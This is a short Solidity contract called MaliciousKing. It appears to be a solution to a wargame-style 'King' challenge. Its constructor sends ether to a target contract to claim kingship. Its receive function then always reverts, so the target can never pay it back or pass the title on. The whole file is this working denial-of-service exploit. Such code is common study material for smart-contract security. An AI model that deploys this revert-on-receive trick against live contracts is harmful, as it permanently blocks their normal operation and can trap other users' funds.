pragma solidity 0.8.0;


contract MaliciousKing {
    constructor(address payable _to) payable {
        (bool success, ) = address(_to).call{value: msg.value}("");
        require(success, "Something did not work!");
    }

    receive() external payable {
        revert("Ye shab dge!");
    }
}
